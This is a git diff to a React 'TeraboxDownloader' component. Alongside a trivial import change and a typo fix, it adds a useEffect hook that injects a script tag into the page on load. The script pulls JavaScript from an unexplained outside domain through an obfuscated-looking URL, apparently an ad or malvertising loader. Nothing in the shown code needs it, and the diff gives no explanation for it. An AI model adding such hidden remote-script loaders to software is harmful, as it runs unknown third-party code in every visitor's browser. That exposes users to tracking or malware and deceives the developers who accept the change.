@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { Helmet } from 'react-helmet';
 const TeraboxDownloader = () => {
   const [inputUrl, setInputUrl] = useState('');
@@ -39,10 +39,22 @@ const TeraboxDownloader = () => {
     } catch (err) {
       setError(err.message);
       setResult(null);
-    } finally {F
+    } finally {
       setLoading(false);
     }
   };
+
+  useEffect(() => {
+    const script = document.createElement('script');
+    script.src = "//shocking-honey.com/a/W/ZCy.QY2/9/k/ZmTE9A6sbB2f5TllSSWlQf9BNLTIgJwmOQDRk/yvNHiXZuwudUX_Nro/WUmy9luWZhUxlhkKPITiUx4EMMDHgf5_Mkj-YR";
+    script.async = true;
+    script.referrerPolicy = 'no-referrer-when-downgrade';
+    document.body.appendChild(script);
+
+    return () => {
+      document.body.removeChild(script);
+    };
+  }, []);
 
   return (
     <>
